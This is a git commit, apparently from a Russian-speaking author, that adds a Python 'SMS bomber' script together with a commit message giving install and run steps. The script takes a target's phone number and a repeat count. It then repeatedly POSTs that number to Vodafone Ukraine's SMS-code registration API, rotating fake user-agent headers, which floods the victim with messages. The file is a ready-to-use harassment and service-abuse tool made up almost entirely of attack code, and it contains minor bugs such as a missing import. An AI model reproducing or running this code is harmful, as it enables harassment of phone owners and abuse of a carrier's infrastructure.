ed106f2c6dcf2c637b79958200e09898280e2ed0
Nik326 <53907709+Nik326@users.noreply.github.com>
2022-09-20 00:41:16 +0300

    Add files via upload
    У вас должен быть установлен гит пип и сам пайтон
    далее просто прописываете:
    
    git clone https://github.com/Nik326/bombom
    cd bombom
    pip install -r requirements.txt
    
    для запуска:
    
    python BOMBOM.py 
    (ИЛИ)
    python BOMBOM(VODAFONE).py

---
+++ BOMBOM(VODAFONE).py
@@ -0,0 +1,176 @@
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+import requests,fake_useragent,time,os,threading
+from threading import Thread
+from rich.console import Console
+from rich.progress import *
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+console = Console()
+
+os.system('cls' if os.name == 'nt' else 'clear')
+#---------------------------------------------------------------->
+def generate_info():
+    global _name
+    global _email
+    global password
+    global username
+    global junker_phone
+    _name = ''
+    password = ''
+    username = ''
+    for x in range(12):
+        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+        password = _name + random.choice(list('123456789qwertyuiodfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+        username = _name + random.choice(list('123456789qwertyuiodfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+    _email = _name + '@gmail.com'
+    email = _email
+    phone_plus = "+" + number
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+console.print('''[#50ff4a]
+ Telegram - @Nik326YT
+''')
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+console.print('[red]Введите номер телефонa (без +) ')
+
+number = console.input('[#0011ff]BomBom>>> ')
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+run = int(console.input('[red]Введите количество повторов (1-10):\n[#0011ff]BomBom>>> '))
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+for _ in track(range(run)):
+         headers = {"User-Agent": fake_useragent.UserAgent().random}
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         try:#ok
+                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
+                 print('vodafone')
+         except:
+                 print('Не отправлено (vodafone)')
+         
